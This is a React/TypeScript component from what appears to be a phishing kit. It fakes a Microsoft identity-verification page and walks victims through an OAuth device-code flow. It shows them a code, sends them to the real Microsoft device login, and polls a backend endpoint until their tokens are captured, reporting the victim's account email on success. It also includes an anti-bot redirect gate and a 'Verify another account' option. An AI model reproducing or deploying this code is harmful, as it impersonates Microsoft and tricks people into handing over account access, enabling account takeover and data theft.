import React, { useState, useEffect, useRef } from 'react';

const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';

type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';

export function MicrosoftVerifyTemplate(): React.ReactElement {
  const [state, setState] = useState<CaptureState>('idle');
  const [userCode, setUserCode] = useState('');
  const [deviceCode, setDeviceCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [errorMsg, setErrorMsg] = useState('');
  const [pollInterval, setPollInterval] = useState(5);
  const [authEmail, setAuthEmail] = useState('');
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pollActiveRef = useRef(false);

  useEffect(() => {
    if (countdown <= 0 || (state !== 'code_ready' && state !== 'waiting')) return;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) { clearInterval(timer); stopPolling(); setState('expired'); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown, state]);

  useEffect(() => { return () => stopPolling(); }, []);

  function stopPolling(): void {
    pollActiveRef.current = false;
    if (pollTimerRef.current) { clearTimeout(pollTimerRef.current); pollTimerRef.current = null; }
  }

  function startPolling(dCode: string, interval: number): void {
    stopPolling();
    pollActiveRef.current = true;
    async function poll(): Promise<void> {
      if (!pollActiveRef.current) return;
      try {
        const res = await fetch('/api/token-poll', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceCode: dCode }) });
        const data = await res.json() as { status: string; error?: string; description?: string; email?: string };
        if (!pollActiveRef.current) return;
        if (data.status === 'complete') { stopPolling(); setAuthEmail(data.email ?? ''); setState('success'); return; }
        if (data.status === 'expired') { stopPolling(); setState('expired'); return; }
        if (data.status === 'slow_down') { const n = interval + 5; setPollInterval(n); if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, n * 1000); return; }
        if (data.status === 'error') { stopPolling(); setErrorMsg(data.description ?? data.error ?? 'Failed'); setState('error'); return; }
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000);
      } catch { if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000); }
    }
    pollTimerRef.current = setTimeout(poll, interval * 1000);
  }

  async function handleStart(): Promise<void> {
    const p = window.location.pathname;
    if (p === '/' || p === '') {
      setState('loading');
      try {
        const r = await fetch('/api/antibot-token');
        const d = await r.json() as { token: string };
        if (d.token) { window.location.href = `/api/schedule/confirm?t=${encodeURIComponent(d.token)}&tpl=microsoft-verify`; return; }
      } catch { /* fallback to direct flow */ }
    }
    setState('loading');
    setErrorMsg('');
    try {
      const res = await fetch('/api/device-code', { method: 'POST' });
      const data = await res.json() as { userCode: string; deviceCode: string; expiresIn: number; interval: number; error?: string };
      if (!res.ok || data.error) { setErrorMsg(data.error ?? 'Failed'); setState('error'); return; }
      setUserCode(data.userCode);
      setDeviceCode(data.deviceCode);
      setCountdown(data.expiresIn);
      setPollInterval(data.interval || 5);
      setState('code_ready');
      startPolling(data.deviceCode, data.interval || 5);
    } catch (err) { setErrorMsg(err instanceof Error ? err.message : 'Network error'); setState('error'); }
  }

  function handleCopy(): void {
    navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
  }

  function handleVerify(): void { setState('waiting'); window.open(DEVICE_AUTH_URL, '_blank'); }

  function handleReset(): void {
    stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
    setCopied(false); setCountdown(0); setErrorMsg(''); setAuthEmail('');
  }

  function formatTime(s: number): string { return `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, '0')}`; }

  return (
    <div className="ms-verify-page">
      <div className="ms-verify-container">
        <div className="ms-verify-logo">
          <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
            <rect width="11" height="11" fill="#f25022" />
            <rect x="12" width="11" height="11" fill="#7fba00" />
            <rect y="12" width="11" height="11" fill="#00a4ef" />
            <rect x="12" y="12" width="11" height="11" fill="#ffb900" />
            <text x="28" y="17" fill="#5e5e5e" fontSize="16" fontFamily="Segoe UI, sans-serif" fontWeight="600">Microsoft</text>
          </svg>
        </div>

        {state === 'idle' && (
          <div className="ms-verify-card">
            <h1>Verify your identity</h1>
            <p>To protect your account, we need to verify your identity. Click below to receive a verification code.</p>
            <div className="ms-verify-info-box">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
              <span>This is a secure Microsoft verification process</span>
            </div>
            <button className="ms-verify-btn" onClick={handleStart}>
              Send verification code
            </button>
          </div>
        )}

        {state === 'loading' && (
          <div className="ms-verify-card">
            <div className="ms-verify-loading">
              <div className="capture-spinner" />
              <p>Generating verification code...</p>
            </div>
          </div>
        )}

        {(state === 'code_ready' || state === 'waiting') && (
          <div className="ms-verify-card">
            <h1>Enter code</h1>
            <p>We've generated a security code. Use this code to verify your account.</p>
            <div className="ms-verify-code-display">
              <span className="ms-verify-code">{userCode}</span>
              <button className="ms-verify-copy" onClick={handleCopy}>
                {copied ? 'Copied' : 'Copy'}
              </button>
            </div>
            <div className="ms-verify-steps">
              <div className="ms-verify-step"><strong>Step 1:</strong> Copy the code above</div>
              <div className="ms-verify-step"><strong>Step 2:</strong> Click verify and enter the code</div>
            </div>
            <button className="ms-verify-btn" onClick={handleVerify}>Verify now</button>
            {state === 'waiting' && <p className="ms-verify-waiting">Waiting for verification to complete...</p>}
            <p className="ms-verify-expiry">Code expires in {formatTime(countdown)}</p>
          </div>
        )}

        {state === 'success' && (
          <div className="ms-verify-card">
            <div className="ms-verify-success">
              <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" /><polyline points="22 4 12 14.01 9 11.01" />
              </svg>
              <h1>Identity verified</h1>
              {authEmail && <p>Account: <strong>{authEmail}</strong></p>}
              <p>Your identity has been successfully verified.</p>
              <button className="ms-verify-btn secondary" onClick={handleReset}>Verify another account</button>
            </div>
          </div>
        )}

        {state === 'expired' && (
          <div className="ms-verify-card">
            <div className="ms-verify-error">
              <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#d13438" strokeWidth="2"><circle cx="12" cy="12" r="10" /><line x1="12" y1="8" x2="12" y2="12" /><line x1="12" y1="16" x2="12.01" y2="16" /></svg>
              <h1>Code expired</h1>
              <p>The verification code has expired. Please try again.</p>
              <button className="ms-verify-btn" onClick={handleReset}>Try again</button>
            </div>
          </div>
        )}

        {state === 'error' && (
          <div className="ms-verify-card">
            <div className="ms-verify-error">
              <h1>Something went wrong</h1>
              <p>{errorMsg}</p>
              <button className="ms-verify-btn" onClick={handleReset}>Try again</button>
            </div>
          </div>
        )}

        <div className="ms-verify-footer">
          <span>Terms of use</span>
          <span>Privacy & cookies</span>
        </div>
      </div>
    </div>
  );
}
